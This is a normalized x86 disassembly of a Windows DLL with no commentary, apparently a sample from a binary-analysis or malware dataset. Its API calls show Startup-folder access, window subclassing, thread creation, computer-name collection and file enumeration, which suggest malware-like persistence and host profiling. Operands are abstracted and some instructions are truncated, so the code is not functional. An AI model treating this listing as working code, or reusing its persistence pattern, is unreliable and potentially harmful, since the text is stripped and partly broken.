MemoryAllocError
sub esp 0x474
push ebx
push ebp
push esi
push edi
mov ecx 0x7f
xor eax eax
lea edi [ esp + 0x105 ]
mov [ esp + 0x104 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x385 ]
mov [ esp + 0x384 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor ax ax
pop ebx
add esp 0x474
retn
mov [ rw-data ] 0x1
call sub_1000c930
test eax eax
je r-xdata
call sub_1000c800
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
or ax 0xffff
pop ebx
add esp 0x474
retn
call sub_1000c8f0
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
or ax 0xffff
pop ebx
add esp 0x474
retn
mov ebp [ Sleep@IAT ]
push 0x7d0
call ebp
call sub_1000baa0
mov ebx eax
lea eax [ esp + 0x384 ]
push 0x100
push eax
push __dos_header
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x384 ]
push ecx
call sub_1000b9b0
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
sub edx 0x4
[ edi ] [ esi ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ ecx + edx ] al
lea eax [ esp + 0x108 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
push ebx
call sub_10002e30
add esp 0x10
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
or ax 0xffff
pop ebx
add esp 0x474
retn
push rw-data
lea edx [ esp + 0x108 ]
push rw-data
push edx
push ebx
call sub_1000ca80
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea eax [ esi + 0x40 ]
lea ecx [ esp + 0x44 ]
push eax
push ecx
call sub_1000cf80
lea edx [ esp + 0x1c ]
push esi
push edx
call sub_1000cf80
add esp 0x10
lea eax [ esp + 0x44 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
movsx eax [ esi + 0x44c ]
push rw-data
push esi
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edi [ eax + eax * 4 ]
shl edi 0x5
call sub_10003100
lea ecx [ esi + 0x140 ]
lea edx [ esp + 0x30c ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x314 ]
lea ecx [ esp + 0x24 ]
push eax
lea edx [ esp + 0x58 ]
push ecx
push edx
push 0x1
call sub_1000dac0
add esp 0x20
test ebx ebx
je r-xdata
push esi
call sub_10003240
add esp 0x4
test eax eax
push esi
jge r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push 0x2710
call ebp
jmp r-xdata
call sub_10003240
lea eax [ esi + 0x20 ]
lea ecx [ esp + 0x388 ]
push eax
push ecx
xor ebp ebp
call sub_1000cf80
lea edx [ esp + 0x20 ]
lea eax [ esp + 0x50 ]
push edx
push eax
lea ecx [ esp + 0x118 ]
push rw-data
push ecx
call sub_1000401e
lea edx [ esp + 0x120 ]
lea eax [ esp + 0x3a0 ]
push edx
push eax
call sub_1000bc30
add esp 0x24
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
call sub_1000cf70
add esp 0x4
xor ax ax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x474
retn
lea ecx [ esi + 0x26c ]
lea edx [ esp + 0x104 ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x10c ]
push eax
call sub_1000c880
add esp 0xc
test eax eax
jne r-xdata
lea edx [ esi + 0x1c0 ]
push 0x40
lea eax [ esp + 0xc8 ]
push edx
push eax
call sub_10003f20
lea ecx [ esi + 0x200 ]
push 0x10
lea edx [ esp + 0x44 ]
push ecx
push edx
call sub_10003f20
push esi
call sub_1000cf70
lea eax [ esp + 0x120 ]
lea ecx [ esp + 0x30 ]
push eax
push ecx
push 0x0
call sub_10002e30
add esp 0x28
test eax eax
jl r-xdata
push esi
push 0x0
call sub_100018b0
add esp 0x8
test eax eax
jge r-xdata
mov edx [ esp + 0x10 ]
push edx
call sub_1000bce0
mov ebp [ esp + 0x14 ]
push esi
push ebp
push ebx
call sub_100015d0
add esp 0x10
push 0xbb8
call [ Sleep@IAT ]
inc ebp
cmp ebp 0xa
jg r-xdata
push esi
call sub_1000cf70
add esp 0x4
push 0xffffffff
call ebp
lea ecx [ esi + 0x30c ]
lea edx [ esp + 0x104 ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x10c ]
lea ecx [ esp + 0x4c ]
push eax
push ecx
call sub_10002bf0
lea edx [ esp + 0x314 ]
lea eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x58 ]
push eax
push ecx
push 0x1
call sub_1000dac0
add esp 0x20
test edi edi
je r-xdata
push rw-data
lea edx [ esp + 0x108 ]
push rw-data
push edx
push 0x0
call sub_1000ca80
mov esi eax
add esp 0x10
test esi esi
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x104 ]
lea edx [ esp + 0x384 ]
push ecx
push edx
call sub_1000bc30
add esp 0x8
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
push edi
call ebp
jmp r-xdata
mov [ rw-data ] 0x0
push 0x40
movsx eax [ esi + 0x44c ]
lea ecx [ esi + 0x1c0 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edi [ eax + eax * 4 ]
lea eax [ esp + 0xc8 ]
push eax
push ecx
shl edi 0x5
call sub_10003f20
lea edx [ esp + 0x40 ]
push 0x10
lea eax [ esi + 0x200 ]
push edx
push eax
call sub_10003f20
add esp 0x18
lea ecx [ esi + 0x26c ]
lea edx [ esp + 0x104 ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x10c ]
push eax
call sub_1000c880
add esp 0xc
test eax eax
jne r-xdata
lea edx [ esi + 0x1c0 ]
push 0x40
lea eax [ esp + 0xc8 ]
push edx
push eax
call sub_10003f20
lea ecx [ esi + 0x200 ]
push 0x10
lea edx [ esp + 0x44 ]
push ecx
push edx
call sub_10003f20
push esi
call sub_1000cf70
lea eax [ esp + 0x120 ]
lea ecx [ esp + 0x30 ]
push eax
push ecx
push ebx
call sub_10002e30
add esp 0x28
test eax eax
jl r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x44 ]
push eax
push ecx
call sub_10003030
push esi
push ebp
call sub_100018b0
add esp 0x10
test eax eax
jge r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x44 ]
push eax
push ecx
call sub_10003030
push esi
call sub_1000cf70
add esp 0xc
xor ax ax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x474
retn
push ebp
call sub_1000bd00
mov ebp [ Sleep@IAT ]
add esp 0x4
lea ecx [ esi + 0x30c ]
lea edx [ esp + 0x104 ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x10c ]
lea ecx [ esp + 0x4c ]
push eax
push ecx
call sub_10002bf0
lea edx [ esp + 0x314 ]
lea eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x58 ]
push eax
push ecx
push 0x1
call sub_1000dac0
add esp 0x20
test edi edi
je r-xdata
push rw-data
lea edx [ esp + 0x108 ]
push rw-data
push edx
push ebx
call sub_1000ca80
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push edi
call [ Sleep@IAT ]
jmp r-xdata
mov [ rw-data ] 0x0
push 0x40
movsx eax [ esi + 0x44c ]
lea ecx [ esi + 0x1c0 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edi [ eax + eax * 4 ]
lea eax [ esp + 0xc8 ]
push eax
push ecx
shl edi 0x5
call sub_10003f20
lea edx [ esp + 0x40 ]
push 0x10
lea eax [ esi + 0x200 ]
push edx
push eax
call sub_10003f20
add esp 0x18
sub_100015d0
mov eax [ esp + 0x4 ]
sub esp 0x424
test eax eax
push ebx
push esi
je r-xdata
mov esi [ esp + 0x438 ]
lea edx [ esp + 0x2c ]
mov [ rw-data ] 0x0
lea ecx [ esi + 0x40 ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x14 ]
push esi
push eax
call sub_1000cf80
add esp 0x10
lea ecx [ esp + 0x1ac ]
push 0x1
push 0x7
push ecx
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
lea edx [ esp + 0xc ]
lea eax [ esp + 0x1ac ]
push edx
push eax
lea ecx [ esp + 0x334 ]
push rw-data
push ecx
call sub_1000401e
lea edx [ esp + 0x33c ]
push edx
call sub_10004070
lea eax [ esp + 0x20 ]
push eax
push rw-data
call sub_1000401e
lea ecx [ esp + 0x28 ]
lea edx [ esp + 0x48 ]
push ecx
push edx
push rw-data
push rw-data
call sub_1000401e
add esp 0x2c
mov ebx [ esp + 0x438 ]
push edi
lea ecx [ esp + 0x30 ]
lea eax [ ebx + 0xc0 ]
push eax
push ecx
call sub_1000cf80
lea edi [ esp + 0x38 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xb8 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xbc ]
push ecx
call sub_1000409a
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1c0 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x140 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x1c0 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ecx [ esp + ecx + 0x40 ]
push ecx
push rw-data
push edx
call sub_1000401e
lea eax [ esp + 0x14c ]
push rw-data
push eax
call sub_1000bb20
mov edi eax
or ecx 0xffffffff
xor eax eax
add esp 0x24
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xb0 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xb0 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
pop edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
push 0x0
push 0x0
push sub_10001800
push 0x0
push 0x0
call [ CreateThread@IAT ]
pop esi
xor eax eax
pop ebx
add esp 0x424
retn
lea ecx [ ebx + 0x40 ]
lea edx [ esp + 0x2c ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x14 ]
push ebx
push eax
call sub_1000cf80
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x3c ]
push ecx
push edx
lea eax [ esp + 0x2c4 ]
push rw-data
push eax
call sub_1000401e
mov esi [ esp + 0x454 ]
lea ecx [ esp + 0x2cc ]
lea edx [ esp + 0x2c ]
push ecx
lea eax [ esp + 0x150 ]
push edx
push eax
push esi
call sub_1000bd20
add esp 0x30
mov [ rw-data ] esi
jmp r-xdata
sub_10001800
push esi
mov esi [ GetModuleHandleA@IAT ]
push rw-data
call esi
test eax eax
jne r-xdata
push 0x0
call sub_1000bbf0
add esp 0x4
push sub_10001850
push 0xfffffffc
push eax
call [ SetWindowLongA@IAT ]
mov [ rw-data ] eax
xor eax eax
pop esi
retn 0x4
push edi
mov edi [ Sleep@IAT ]
push 0xbb8
call edi
push rw-data
call esi
test eax eax
je r-xdata
pop edi
sub_10001850
push esi
mov esi [ esp + 0xc ]
cmp esi 0x11
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
push ecx
push esi
push edx
push eax
call [ CallWindowProcA@IAT ]
pop esi
retn 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
call sub_10011010
add esp 0xc
push eax
call sub_1000bcb0
add esp 0x4
jmp r-xdata
sub_100018b0
mov eax [ esp + 0x4 ]
sub esp 0x100
test eax eax
jne r-xdata
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x10c ]
push ebp
mov ebp [ Sleep@IAT ]
push esi
push edi
mov [ rw-data ] 0x1
lea ecx [ ebx + 0x58e ]
lea edx [ esp + 0x90 ]
push ecx
push edx
call sub_1000cf80
lea eax [ ebx + 0x5ce ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
lea eax [ ebx + 0x44e ]
lea ecx [ esp + 0x90 ]
push eax
push ecx
call sub_1000cf80
lea edx [ ebx + 0x48e ]
lea eax [ esp + 0x18 ]
push edx
push eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
call sub_1000cf80
lea edi [ esp + 0xa0 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x100
retn
mov eax 0x1
mov [ rw-data ] eax
jmp r-xdata
mov edx [ rw-data ]
push edx
call sub_1000e9d0
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x94 ]
push eax
push ecx
call sub_1000ea10
mov esi eax
add esp 0xc
test esi esi
je r-xdata
cmp eax 0x1
jne r-xdata
push esi
xor edi edi
call sub_1000eb10
add esp 0x4
test eax eax
jge r-xdata
jg r-xdata
inc edi
cmp edi 0x6
jg r-xdata
mov edx [ rw-data ]
push edx
push ebx
push esi
call sub_10001b40
add esp 0xc
test eax eax
push esi
jge r-xdata
mov eax [ rw-data ]
mov edx 0x1
cmp eax edx
jne r-xdata
test eax eax
push 0x3e8
call ebp
push esi
call sub_1000eb10
add esp 0x4
test eax eax
jl r-xdata
call sub_1000ead0
mov eax [ rw-data ]
mov edi 0x1
add esp 0x4
cmp eax edi
jne r-xdata
call sub_1000ead0
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x100
retn
mov ecx 0x2
cmp eax ecx
jne r-xdata
mov eax 0x2
mov [ rw-data ] eax
jmp r-xdata
lea ecx [ ebx + 0x58e ]
lea edx [ esp + 0x90 ]
push ecx
push edx
call sub_1000cf80
lea eax [ ebx + 0x5ce ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
lea eax [ ebx + 0x4ee ]
lea ecx [ esp + 0x90 ]
push eax
push ecx
call sub_1000cf80
lea edx [ ebx + 0x52e ]
lea eax [ esp + 0x18 ]
push edx
push eax
jmp r-xdata
push esi
mov [ rw-data ] edx
mov [ rw-data ] ecx
call sub_1000ead0
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x100
retn
cmp [ rw-data ] ecx
jne r-xdata
mov ecx [ rw-data ]
push ecx
push ebx
push esi
call sub_10001fc0
add esp 0xc
test eax eax
push esi
jge r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x100
retn
call sub_1000cf80
add esp 0x10
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x90 ]
push edx
push eax
call sub_1000ea10
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov eax edx
mov [ rw-data ] edx
mov [ rw-data ] eax
jmp r-xdata
call sub_1000ead0
mov al [ rw-data ]
add esp 0x4
cmp al 0x1
jne r-xdata
call sub_1000ead0
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x100
retn
mov [ rw-data ] edi
mov [ rw-data ] 0x2
sub_10001b40
sub esp 0x400
push ebx
push ebp
push esi
push edi
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0xd1 ]
mov [ esp + 0xd0 ] 0x0
[ edi ]
stosw [ edi ]
mov ebp [ esp + 0x418 ]
stosb [ edi ]
cmp [ esp + 0x41c ] 0x1
jne r-xdata
mov ecx 0x20
xor eax eax
lea edi [ esp + 0xd0 ]
[ edi ]
lea eax [ ebp + 0x4ce ]
lea ecx [ esp + 0x50 ]
push eax
push ecx
call sub_1000cf80
lea edx [ esp + 0x58 ]
lea eax [ esp + 0xd8 ]
push edx
push rw-data
push eax
call sub_1000401e
add esp 0x14
jmp r-xdata
lea edx [ ebp + 0x200 ]
lea eax [ esp + 0x10 ]
push edx
push eax
call sub_1000cf80
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xd0 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0xd0 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xd0 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ esp + 0x418 ]
push ecx
call sub_1000eeb0
add esp 0x8
test eax eax
jge r-xdata
lea ecx [ ebp + 0x1c0 ]
lea edx [ esp + 0x10 ]
push ecx
push edx
call sub_1000cf80
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
dec ecx
je r-xdata
lea edx [ ebp + 0x40 ]
lea eax [ esp + 0x150 ]
push edx
push eax
call sub_1000cf80
lea ecx [ ebp + 0x210 ]
lea edx [ esp + 0x58 ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x60 ]
lea ecx [ esp + 0x160 ]
push eax
push ecx
lea edx [ esp + 0x1e8 ]
push rw-data
push edx
call sub_1000401e
lea eax [ ebp + 0x218 ]
lea ecx [ esp + 0x30 ]
push eax
push ecx
call sub_1000cf80
lea edi [ esp + 0x38 ]
or ecx 0xffffffff
xor eax eax
add esp 0x28
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xd0 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0xd0 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xd0 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ esp + 0x418 ]
push ecx
call sub_1000eeb0
add esp 0x8
test eax eax
jge r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x400
retn
lea edx [ esp + 0x1d0 ]
mov edi rw-data
lea edi [ esp + 0x10 ]
lea edx [ esp + 0x1d0 ]
jmp r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x400
retn
lea eax [ ebp + 0x21c ]
lea ecx [ esp + 0x150 ]
push eax
push ecx
call sub_1000cf80
lea edi [ esp + 0x158 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
dec ecx
je r-xdata
xor esi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov ebx [ FindFirstFileA@IAT ]
and ecx 0x3
lea eax [ esp + 0x2d0 ]
[ edi ] [ esi ]
lea ecx [ esp + 0x1d0 ]
push eax
push ecx
call ebx
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x400
retn
lea edx [ ebp + 0x25c ]
lea eax [ esp + 0x50 ]
push edx
push eax
call sub_1000cf80
add ebp 0x264
lea ecx [ esp + 0x18 ]
push ebp
push ecx
call sub_1000cf80
lea edx [ esp + 0x20 ]
lea eax [ esp + 0x60 ]
push edx
lea ecx [ esp + 0x164 ]
push eax
push ecx
lea edx [ esp + 0x1ec ]
push rw-data
push edx
call sub_1000401e
add esp 0x24
lea eax [ esp + 0x2d0 ]
lea ecx [ esp + 0x1d0 ]
push eax
push ecx
call ebx
mov edi eax
cmp edi 0xffffffff
je r-xdata
lea edx [ esp + 0x2d0 ]
xor esi esi
push edx
push edi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x414 ]
lea eax [ esp + 0x50 ]
lea ecx [ esp + 0xd0 ]
push eax
push ecx
push edx
call sub_1000ebc0
add esp 0xc
test eax eax
jge r-xdata
xor esi esi
lea edx [ esp + 0x2fc ]
lea eax [ esp + 0x150 ]
push edx
push eax
lea ecx [ esp + 0x58 ]
push rw-data
push ecx
call sub_1000401e
lea edx [ esp + 0x60 ]
push edx
call sub_1000b960
add esp 0x14
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
lea ecx [ esp + 0x50 ]
push ecx
push 0x3e8
call [ Sleep@IAT ]
inc esi
cmp esi 0x5
jl r-xdata
lea ecx [ esp + 0x2d0 ]
xor esi esi
push ecx
push edi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x414 ]
lea eax [ esp + 0x50 ]
lea ecx [ esp + 0xd0 ]
push eax
push ecx
push edx
call sub_1000ebc0
add esp 0xc
test eax eax
jge r-xdata
lea eax [ esp + 0x50 ]
push eax
jmp r-xdata
lea edx [ esp + 0x2fc ]
lea eax [ esp + 0x150 ]
push edx
push eax
lea ecx [ esp + 0x58 ]
push rw-data
push ecx
call sub_1000401e
lea edx [ esp + 0x60 ]
push edx
call sub_1000b960
add esp 0x14
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
lea eax [ esp + 0x50 ]
push eax
call sub_10004070
add esp 0x4
push 0x3e8
call [ Sleep@IAT ]
inc esi
cmp esi 0x5
jl r-xdata
call sub_10004070
add esp 0x4
jmp r-xdata
sub_10001fc0
mov eax 0x2570
call sub_10004190
push ebx
push ebp
push esi
push edi
mov ecx 0x7ff
xor eax eax
lea edi [ esp + 0x581 ]
mov [ esp + 0x580 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0xc1 ]
mov [ esp + 0xc0 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x201 ]
mov [ esp + 0x200 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov ebx [ esp + 0x2588 ]
mov [ esp + 0x11 ] eax
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x15 ] ax
mov [ esp + 0x17 ] al
mov [ esp + 0x18 ] eax
cmp [ esp + 0x258c ] 0x1
jne r-xdata
mov ecx 0x20
xor eax eax
lea edi [ esp + 0x20 ]
[ edi ]
lea ecx [ ebx + 0x56e ]
lea edx [ esp + 0xc0 ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0xc8 ]
lea ecx [ esp + 0x28 ]
push eax
push rw-data
push ecx
call sub_1000401e
add esp 0x14
jmp r-xdata
lea eax [ ebx + 0x40 ]
lea ecx [ esp + 0x380 ]
push eax
push ecx
call sub_1000cf80
lea edx [ esp + 0x1c8 ]
push ebx
push edx
call sub_1000cf80
add ebx 0x140
lea eax [ esp + 0x410 ]
push ebx
push eax
call sub_1000cf80
mov esi [ esp + 0x259c ]
lea ecx [ esp + 0x598 ]
push 0x2000
lea edx [ esp + 0x3c ]
push ecx
push edx
push esi
call sub_1000f050
add esp 0x28
test eax eax
jl r-xdata
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x20 ]
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x20 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xc0 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x20 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edx [ ebx + 0x1c0 ]
lea eax [ esp + 0xc0 ]
push edx
push eax
call sub_1000cf80
lea edi [ esp + 0xc8 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
dec ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2570
retn
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
jne r-xdata
lea edx [ esp + 0x20 ]
lea eax [ esi + 0x8 ]
push edx
push eax
push rw-data
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0xc0 ]
push eax
push ecx
mov [ esp + 0x20 ] 0x100
call [ GetComputerNameA@IAT ]
lea edx [ esp + 0xc0 ]
lea eax [ esi + 0x8 ]
push edx
push eax
push rw-data
jmp r-xdata
jmp r-xdata
lea ecx [ esp + 0x30c ]
push ecx
call [ wsprintfA@IAT ]
mov al [ esp + 0x590 ]
add esp 0x10
xor ebx ebx
lea ebp [ esp + 0x580 ]
test al al
je r-xdata
lea edx [ esp + 0x300 ]
push ebp
push edx
lea eax [ esp + 0x488 ]
push rw-data
push eax
call sub_1000401e
add esp 0x10
push 0x7
push ebp
call sub_1000ba60
add esp 0x4
lea ecx [ esp + 0x14 ]
push eax
push ecx
call sub_10003f20
lea edx [ esp + 0x1c ]
push rw-data
push edx
call sub_10009d30
add esp 0x14
test eax eax
jne r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xa0 ]
[ edi ]
not ecx
sub edi ecx
push ebp
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xc4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x384 ]
push ecx
push rw-data
push edx
call sub_1000401e
lea eax [ esp + 0xd0 ]
push eax
call sub_1000b960
add esp 0x14
test eax eax
jne r-xdata
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x480 ]
push eax
push ecx
push esi
call sub_1000f3b0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
lea edi [ esp + 0xc0 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x200 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x200 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x200 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi [ esp + 0x2588 ]
lea ecx [ esp + 0x484 ]
push ecx
push edi
call sub_1000f280
add esp 0xc
test eax eax
jge r-xdata
mov edi [ esp + 0x2584 ]
lea ecx [ esp + 0xc0 ]
lea edx [ esp + 0x480 ]
push ecx
push edx
push edi
call sub_1000f280
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esp + 0x2584 ]
lea edx [ esp + 0x20 ]
push ebp
push edx
push eax
xor esi esi
call sub_1000ed00
add esp 0xc
test eax eax
jge r-xdata
push 0x3e8
call [ Sleep@IAT ]
inc ebx
cmp ebx 0x5
jl r-xdata
lea edx [ esp + 0x20 ]
push ebp
push edx
push edi
xor esi esi
call sub_1000ed00
add esp 0xc
test eax eax
jge r-xdata
push 0x3e8
call [ Sleep@IAT ]
inc ebx
cmp ebx 0x5
jl r-xdata
lea eax [ esp + 0x20 ]
push ebp
push eax
push edi
xor esi esi
call sub_1000ed00
add esp 0xc
test eax eax
jge r-xdata
push 0x3e8
call [ Sleep@IAT ]
inc ebx
cmp ebx 0x5
jl r-xdata
lea eax [ esp + 0x400 ]
lea ecx [ esp + 0x1c0 ]
push eax
mov eax [ esp + 0x20 ]
